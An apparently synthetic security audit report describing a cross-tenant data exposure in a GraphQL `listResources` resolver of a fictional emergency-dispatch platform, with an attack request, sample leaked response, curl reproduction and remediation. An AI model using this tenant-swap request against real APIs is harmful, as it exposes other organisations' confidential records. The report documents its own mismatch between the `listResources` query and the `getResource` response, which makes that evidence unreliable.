# Security Analysis Report
**System:** FirstResponse CAD Integration
**Domain:** Government / Public Safety
**Example ID:** GQL-0308
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User — Pattern 10.5 | Draft/non-published resource access via `listResources` — attacker retrieves non-public CAD dispatch records belonging to another public safety agency (tenant) |

---

## Finding 1 — Single-User: Draft/Non-Published Resource Access (Pattern 10.5)

### Summary
The `listResources` resolver on FirstResponse CAD Integration (`api.firstresponse-cad-in.example.com`) accepts a client-supplied `tenantId` parameter without validating it against the JWT's `tenantId`. Per §5.0 Pattern 10.5, an attacker can access draft or non-published CAD records belonging to another public safety agency tenant (`tenant-5a8f`) using a token for `tenant-5984`. The vulnerability exposes operational dispatch records that may be unpublished/draft status and therefore even more restricted than standard records.

**Context.txt inconsistency (documented):** HAR query uses `listResources(tenantId: "tenant-5a8f")`, but the response key in §6.0 is `getResource`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`listResources`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no user/tenant dimension), enabling cross-tenant cache poisoning of emergency dispatch data.

**Pattern:** 10.5 — Draft/non-published resource access (Single-User)
**Affected resolver:** `listResources`
**Affected endpoint:** `POST https://api.firstresponse-cad-in.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.firstresponse-cad-in.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-5984

{"query": "query VulnerableOp { listResources(tenantId: \"tenant-5a8f\") { resourceId ownerId data { sensitiveField } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Resource Returned (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-5a8f",
      "ownerId": "other-user-59845a8f",
      "data": {
        "sensitiveField": "CONFIDENTIAL-59845a8f",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-5984`. Returned data belongs to: `tenant-5a8f`. Cross-tenant public safety data leakage confirmed.

**Context.txt inconsistency:** HAR sends `listResources` query; response body uses key `getResource`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.firstresponse-cad-in.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-5984" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-5a8f\") { resourceId ownerId data { sensitiveField } } }"}'
# Vulnerable: data contains tenant-5a8f CAD dispatch records for attacker tenant-5984
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `listResources` resolver: derive `tenantId` exclusively from JWT claims. Reject client-supplied `tenantId`.
2. Enforce record `status` filtering — draft/non-published records must only be accessible to the creating agency.
3. Re-key Redis cache to include `tenantId`.
